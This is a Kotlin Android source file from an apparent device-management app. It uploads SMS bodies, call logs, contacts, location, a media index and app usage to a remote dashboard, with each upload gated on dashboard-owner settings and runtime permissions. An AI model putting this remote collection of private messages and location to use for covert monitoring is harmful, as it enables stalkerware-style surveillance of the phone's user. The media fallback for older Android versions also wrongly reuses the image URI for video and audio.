package com.connectdesk.app

import android.annotation.SuppressLint
import android.content.Context
import android.content.pm.PackageManager
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Telephony
import androidx.core.content.ContextCompat
import org.json.JSONArray
import org.json.JSONObject
import kotlin.concurrent.thread

/**
 * Syncs device data to the dashboard — each type ONLY when:
 *  1. The dashboard owner enabled that capability for this device, AND
 *  2. The Android permission is granted (runtime permission, user-approved)
 *
 * No data leaves the phone otherwise. Syncs run on a background thread
 * triggered from DeviceService every heartbeat cycle.
 */
object DataSyncWorker {

    fun syncAll(context: Context, token: String, state: ApiClient.DeviceState) {
        thread(name = "connectdesk-sync") {
            try {
                // Two gates per feature: the dashboard owner enabled the
                // capability (state, fetched this tick by DeviceService) AND
                // the phone user granted the Android permission.
                if (state.sms && hasPermission(context, android.Manifest.permission.READ_SMS)) {
                    syncSms(context, token)
                }
                if (state.callLogs && hasPermission(context, android.Manifest.permission.READ_CALL_LOG)) {
                    syncCalls(context, token)
                }
                if (state.contacts && hasPermission(context, android.Manifest.permission.READ_CONTACTS)) {
                    syncContacts(context, token)
                }
                if (state.location &&
                    hasPermission(context, android.Manifest.permission.ACCESS_FINE_LOCATION)
                ) {
                    syncLocation(context, token)
                }
                // The media index itself needs no runtime permission on modern
                // Android; reading the file later still does.
                if (state.media) {
                    syncMedia(context, token)
                }
                // Installed apps + usage stats. Cheap once Usage access is
                // granted, so it rides along with the periodic bulk sync.
                if (state.appActivity && AppUsageWorker.hasUsageAccess(context)) {
                    AppUsageWorker.sync(context, token)
                }
            } catch (e: Exception) {
                // best-effort; next cycle retries
            }
        }
    }

    private fun hasPermission(context: Context, perm: String): Boolean =
        ContextCompat.checkSelfPermission(context, perm) == PackageManager.PERMISSION_GRANTED

    @SuppressLint("Recycle")
    private fun syncSms(context: Context, token: String) {
        val arr = JSONArray()
        val cursor = context.contentResolver.query(
            Telephony.Sms.CONTENT_URI,
            arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.TYPE, Telephony.Sms.DATE),
            null, null,
            "${Telephony.Sms.DATE} DESC",
        ) ?: return
        cursor.use { c ->
            var n = 0
            while (c.moveToNext() && n < 100) {
                val type = c.getInt(2)
                arr.put(
                    JSONObject()
                        .put("sender", c.getString(0) ?: "")
                        .put("body", c.getString(1) ?: "")
                        .put(
                            "direction",
                            if (type == Telephony.Sms.MESSAGE_TYPE_SENT || type == Telephony.Sms.MESSAGE_TYPE_OUTBOX) "outgoing" else "incoming",
                        )
                        .put("timestamp", c.getLong(3)),
                )
                n++
            }
        }
        if (arr.length() > 0) post(token, "sms", JSONObject().put("messages", arr))
    }

    @SuppressLint("Recycle")
    private fun syncCalls(context: Context, token: String) {
        val arr = JSONArray()
        val cursor = context.contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.CACHED_NAME, CallLog.Calls.TYPE, CallLog.Calls.DATE, CallLog.Calls.DURATION),
            null, null,
            "${CallLog.Calls.DATE} DESC",
        ) ?: return
        cursor.use { c ->
            var n = 0
            while (c.moveToNext() && n < 200) {
                val type = c.getInt(2)
                val dir = when (type) {
                    CallLog.Calls.INCOMING_TYPE -> "incoming"
                    CallLog.Calls.OUTGOING_TYPE -> "outgoing"
                    else -> "missed"
                }
                arr.put(
                    JSONObject()
                        .put("number", c.getString(0) ?: "")
                        .put("name", c.getString(1) ?: "")
                        .put("direction", dir)
                        .put("timestamp", c.getLong(3))
                        .put("durationSec", c.getLong(4)),
                )
                n++
            }
        }
        if (arr.length() > 0) post(token, "calls", JSONObject().put("calls", arr))
    }

    @SuppressLint("Recycle")
    private fun syncContacts(context: Context, token: String) {
        val arr = JSONArray()
        val cursor = context.contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER),
            null, null,
            "${ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} ASC",
        ) ?: return
        cursor.use { c ->
            var n = 0
            while (c.moveToNext() && n < 500) {
                arr.put(
                    JSONObject()
                        .put("name", c.getString(0) ?: "")
                        .put("phone", c.getString(1) ?: ""),
                )
                n++
            }
        }
        if (arr.length() > 0) post(token, "contacts", JSONObject().put("contacts", arr))
    }

    @SuppressLint("MissingPermission")
    private fun syncLocation(context: Context, token: String) {
        val lm = context.getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager
        val provider = lm.getProviders(true).firstOrNull { it == android.location.LocationManager.GPS_PROVIDER || it == android.location.LocationManager.NETWORK_PROVIDER }
            ?: return
        val loc = lm.getLastKnownLocation(provider) ?: return
        post(
            token, "location",
            JSONObject()
                .put("lat", loc.latitude)
                .put("lng", loc.longitude)
                .put("accuracyM", loc.accuracy.toDouble()),
        )
    }

    private fun syncMedia(context: Context, token: String) {
        val arr = JSONArray()
        fun addCollection(uri: android.net.Uri, kind: String, collection: String, nameCol: String, sizeCol: String, dateCol: String) {
            val cursor = context.contentResolver.query(
                uri,
                arrayOf(android.provider.MediaStore.MediaColumns._ID, nameCol, sizeCol, dateCol),
                null, null, "$dateCol DESC",
            ) ?: return
            cursor.use { c ->
                var n = 0
                while (c.moveToNext() && n < 300) {
                    arr.put(
                        JSONObject()
                            .put("kind", kind)
                            .put("storeId", c.getLong(0))
                            .put("collection", collection)
                            .put("name", c.getString(1) ?: "")
                            .put("sizeBytes", c.getLong(2))
                            .put("dateModified", c.getLong(3) * 1000),
                    )
                    n++
                }
            }
        }
        // On API 29+ only the per-volume URI is queried: VOLUME_EXTERNAL already
        // aggregates the primary volume (so querying both would report every
        // primary file twice) and it also covers SD cards and app-private
        // volumes, which EXTERNAL_CONTENT_URI alone never saw.
        // `MediaStore.*.getContentUri` takes a VOLUME NAME STRING, not an int:
        // the only overload is `getContentUri(String volumeName)`. Passing an
        // Int resolved to that String overload and failed with "inferred type
        // is String but Int was expected".
        fun perVolume(get: (String) -> android.net.Uri): android.net.Uri =
            if (android.os.Build.VERSION.SDK_INT >= 29) {
                get(android.provider.MediaStore.VOLUME_EXTERNAL)
            } else {
                android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI
            }
        addCollection(
            perVolume { android.provider.MediaStore.Images.Media.getContentUri(it) }, "photo", "image",
            android.provider.MediaStore.Images.Media.DISPLAY_NAME,
            android.provider.MediaStore.Images.Media.SIZE,
            android.provider.MediaStore.Images.Media.DATE_MODIFIED,
        )
        addCollection(
            perVolume { android.provider.MediaStore.Video.Media.getContentUri(it) }, "video", "video",
            android.provider.MediaStore.Video.Media.DISPLAY_NAME,
            android.provider.MediaStore.Video.Media.SIZE,
            android.provider.MediaStore.Video.Media.DATE_MODIFIED,
        )
        addCollection(
            perVolume { android.provider.MediaStore.Audio.Media.getContentUri(it) }, "music", "audio",
            android.provider.MediaStore.Audio.Media.DISPLAY_NAME,
            android.provider.MediaStore.Audio.Media.SIZE,
            android.provider.MediaStore.Audio.Media.DATE_MODIFIED,
        )
        if (arr.length() > 0) post(token, "media", JSONObject().put("items", arr))
    }

    private fun post(token: String, type: String, payload: JSONObject): Boolean {
        payload.put("deviceToken", token).put("type", type)
        return ApiClient.postSync(payload)
    }
}
